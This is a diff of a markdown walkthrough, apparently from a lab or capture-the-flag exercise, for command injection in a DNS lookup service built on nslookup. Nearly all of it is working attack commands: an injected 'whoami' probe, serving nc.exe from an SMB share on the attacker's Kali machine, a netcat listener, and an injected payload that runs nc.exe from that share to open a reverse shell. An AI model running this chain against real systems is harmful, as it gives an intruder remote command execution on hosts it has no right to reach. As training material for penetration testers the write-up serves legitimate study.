@@ -19,16 +19,21 @@ For background the DNS Querying Service is running nslookup and then querying th
 ````
 && whoami
 ````
+
 <img src="https://user-images.githubusercontent.com/127046919/223560695-218399e2-2447-4b67-b93c-caee8e3ee3df.png" width="250" height="240" />
+
 ````
 locate nc.exe
 ````
+
 ````
 smbserver.py -smb2support Share .
 ````
+
 ````
 nc -nlvp 80
 ````
+
 ````
 && cmd.exe /c //<your kali IP>/Share/nc.exe -e cmd.exe <your kali IP> 80
 ````
